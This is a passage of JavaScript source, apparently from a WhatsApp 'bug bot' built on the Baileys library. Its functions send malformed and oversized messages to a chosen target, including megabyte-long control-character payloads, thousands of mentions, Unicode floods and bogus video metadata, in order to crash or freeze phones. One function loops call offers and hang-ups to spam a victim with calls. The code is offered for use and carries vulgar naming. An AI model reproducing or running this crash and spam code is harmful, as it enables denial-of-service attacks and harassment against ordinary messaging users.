                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    },
  }, {
    messageId: null,
    participant: { jid: target }
  });

  for (let i = 0; i < 200; i++) {
    const msg = await generateWAMessageFromContent(jid, {
      viewOnceMessagw: {
        message: {
          messageContextInfo: {
            deviceListMetada: {},
            deviceListMetadaVersion: 2
          },
          interactiveResponseMessage: {
            body: {
              text: "x",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              fromMe: false,
              participant: target,
              forwardingScore: 9999,
              isForwarded: true,
              entryPointConversionSource: "address_message",
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
       message: msg.message
      }
    }, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
    await new Promise((r) => setTimeout(r, 1000));
  }

  var msg = generateWAMessageFromContent(target, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
      "fileLength": "231536",
      "seconds": 88888888,
      "mediaKey": "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
      "caption": "x",
      "height": -99999,
      "width": 99999,
      "fileEncSha256": "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
      "directPath": "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
      "mediaKeyTimestamp": "1771576607",
      "contextInfo": {
        "pairedMediaType": "NOT_PAIRED_MEDIA",
        "statusSourceType": "VIDEO",
        "remoteJid": " #xrellyspec ",
        "mentionedJid": Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`),
        "businessMessageForwardInfo": {
          "businessOwnerJid": "13135550202@s.whatsapp.net",
          "businessDescription": null
        },
        "featureEligibilities": {
          "canBeReshared": true
        },
        "isForwarded": true,
        "forwardingScore": 9999,
        "statusAttributions": [
          {
            "type": "MUSIC",
            "externalShare": {
              "actionUrl": "https://wa.me/settings/linked_devices#,,xrellyspec",
              "source": "INSTAGRAM",
              "duration": 999999999,
              "actionFallbackUrl": "https://wa.me/settings/linked_devices#,,xrellyspec"
            }
          }
        ]
      },
      "streamingSidecar": "xUQqEMh4oVoqMy9qDBB3gaNI3yZbbX7dtli6KJ6N1ijvk09oVJzI8w==",
      "thumbnailDirectPath": "/v/t62.36147-24/640522275_2376887426118122_4696194772404190783_n.enc?ccb=11-4&oh=01_Q5Aa3wHXgSUEMms1n1PJZN7I8Ip8kaEzKYH5nfr9X62LJNv1bw&oe=69BF74C1&_nc_sid=5e03e0",
      "thumbnailSha256": "9kdKXkxHeCZxJ7WwQ00xanJD9CRLfgrs4lxLd/cRBXQ=",
      "thumbnailEncSha256": "DuH7/OR2Jz+SPxDiNyl2wKdUDbr6upAQtCmjwAS22CA=",
      "annotations": [
        {
          "shouldSkipConfirmation": true,
          "embeddedContent": {
            "embeddedMessage": {
              "stanzaId": "ACFC34B6742717BAC2BFE825254E1CD1",
              "message": {
                "extendedTextMessage": {
                  "text": "$",
                  "previewType": "NONE",
                  "inviteLinkGroupTypeV2": "DEFAULT"
                },
                "messageContextInfo": {
                  "messageSecret": "1y9Zx4kWsv7YLUdsLvUAvSSxlE6KVPSyllLwgXkSzfg=",
                  "messageAssociation": {
                    "associationType": 18,
                    "parentMessageKey": {
                      "remoteJid": "status@broadcast",
                      "fromMe": false,
                      "id": "ACEEC73D18B6805DBC04CC8ADF65BF6D",
                      "participant": "13135550202@s.whatsapp.net"
                    }
                  }
                }
              }
            }
          },
          "embeddedAction": true
        }
      ],
      "externalShareFullVideoDurationInSeconds": 8
    }
  }, {})

    let kel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              contextInfo: {
                remoteJid: " x ",
                mentionedJid: ["13135559098@s.whatsapp.net"],
              },
              body: {
                text: "fuck u",
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                version: 3,
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
      },
    );

    await sock.relayMessage('status@broadcast', msg.message, {
      statusJidList: [target]
    });

    await sock.relayMessage('status@broadcast', kel.message, {
      statusJidList: [target]
    });
}

async function SpamcallFcPermanen(sock, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await sock.assertSessions(devices);
    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;
        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );
                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );
        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();
        let {
            nodes: destinations,
            shouldIncludeDeviceIdentity
        } = await sock.createParticipantNodes(
            devices,
            { conversation: "y" },
            { count: "0" }
        );
        const callOffer = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": callId,
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ]
            }]
        };
        
        await sock.sendNode(callOffer);
        await sleep(1000);
        const callTerminate = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "terminate",
                attrs: {
                    "call-id": callId,
                    "reason": "REJECTED",
                    "call-creator": sock.user.id
                },
                content: []
            }]
        };
        
        await sock.sendNode(callTerminate);
        await sleep(1000);
    }
    console.log("Done");
}

async function blankIphone13(sock, target) {
    const randomLatitude = (Math.random() * 180 - 90).toFixed(6);
    const randomLongitude = (Math.random() * 360 - 180).toFixed(6);

    const locationMessage = {
        location: {
            degreesLatitude: Number(randomLatitude),
            degreesLongitude: Number(randomLongitude),
            name: "",
            address: ""
        },
        caption: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + "𑇂𑆵𑆴𑆿".repeat(100000),
        buttons: [
            {
                buttonId: "x",
                buttonText: { displayText: "𑇂𑆵𑆴𑆿".repeat(50000) },
                type: 1
            }
        ],
        headerType: 6,
        requestPaymentMessage: {
            currencyCodeIso4217: "IDR",
            amount1000: 1,
            requestFrom: target,
            noteMessage: {
                extendedTextMessage: {
                    text: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + "𑇂𑆵𑆴𑆿".repeat(100000)
                }
            }
        },
        contextInfo: {
            mentionedJid: [target],
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                title: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + "𑇂𑆵𑆴𑆿".repeat(100000),
                body: "\u0000",
                thumbnailUrl: "",
                sourceUrl: "",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    };

    await sock.sendMessage(
        target,
        locationMessage,
        {
            messageId: `${Date.now()}`,
            participant: target
        }
    );
}

function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }
            
async function sleephandler() {
  const speed = 1;
  const delay = 3500;
  const increase = 500;
  const max = 25500;

  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = delay + (batchIndex * increase);
    if (currentDelay > max) currentDelay = max;
    await new Promise(res => setTimeout(res, currentDelay));

    if ((i + 1) % 60 === 0) {

      await new Promise(res => setTimeout(res, 2 * 60 * 1000));
    }
  }
}

async function singleEra() {
  const speed = 1;
  const initialDelay = 3500;
  const delayIncrease = 500;
  const maxDelay = 25500;
  const resetThreshold = 60;
  const resetDuration = 2 * 60 * 1000;
  
  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = initialDelay + (batchIndex * delayIncrease);
    
    if (currentDelay > maxDelay) currentDelay = maxDelay;
    
    await new Promise(res => setTimeout(res, currentDelay));
    
    if ((i + 1) % resetThreshold === 0) {
      await new Promise(res => setTimeout(res, resetDuration));
    }
  }
}

async function run(total = 15, step = 250) {
  for (let i = 1; i <= total; i++) {
    const delay = i * step;
    await sleep(delay);
  }
}

// ~ End Function Bugs